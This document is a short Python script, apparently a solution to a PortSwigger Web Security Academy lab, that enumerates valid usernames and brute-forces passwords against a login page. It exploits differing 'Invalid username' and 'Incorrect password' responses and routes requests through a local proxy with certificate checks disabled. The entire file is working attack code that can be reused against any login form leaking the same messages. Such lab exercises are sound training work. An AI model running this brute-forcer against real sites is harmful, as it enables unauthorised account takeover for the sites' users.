# Username Enumeration via different responses

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080',
           "https": "http://127.0.0.1:8080"
           }

"""
-> Create usernames.txt, and save all username
-> Create password.txt, and save all password
"""
usernames = open("usernames.txt", "r").read().split("\n")
passwords = open("password.txt", "r").read().split("\n")


def username_finder(url):
    for name in usernames:
        
        data = {
            'username': name,
            'password': "test"
        }
        r = requests.post(url, data=data, proxies=proxies, verify=False)
        res = r.text
        if 'Invalid username' not in res:
            return name


def password_finder(url, username):
    for key in passwords:
        
        data = {
            'username': username,
            'password': key
        }
        r = requests.post(url, data=data, proxies=proxies, verify=False)
        res = r.text
        if 'Incorrect password' not in res:
            print(f"[+] Password of {username}: {key}")
            break


if __name__ == '__main__':
    print("BRUTE-FORCING USERNAME AND PASSWORD")
    url = 'https://0a35005804264c72c15f5dca00ad00af.web-security-academy.net/login'
    print("[+] Finding valid username...")
    user = username_finder(url)
    print(f"[+] {user} is valid username")
    print(f"[+] Finding Valid password...")
    password_finder(url,user)
